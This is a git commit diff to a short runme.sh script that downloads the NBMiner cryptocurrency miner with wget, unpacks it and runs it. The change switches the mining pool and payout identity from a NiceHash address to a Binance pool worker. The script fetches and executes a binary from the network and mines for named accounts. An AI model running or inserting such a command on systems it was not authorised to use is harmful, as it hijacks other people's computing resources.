1c9e0dd6d20be43d2b5a7d87730f8b8a86e0cede
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-01-28 01:30:32 -0500

    Update runme.sh

--- runme.sh
+++ runme.sh
@@ -1,2 +1,2 @@
 wget https://github.com/NebuTech/NBMiner/releases/download/v39.2/NBMiner_39.2_Linux.tgz && tar -xf  NBMiner_39.2_Linux.tgz && cd NBMiner_Linux && 
-./nbminer -a ethash -o nicehash+tcp://daggerhashimoto.eu.nicehash.com:3353 -u 3F8eMXyShK8d1dZFtBr13hcAHMMGJDKDSM -p x --no-watchdog
+./nbminer -a ethash -o stratum+tcp://ethash.poolbinance.com:1800 -u teguhcong.RIG_TREX -p x --no-watchdog
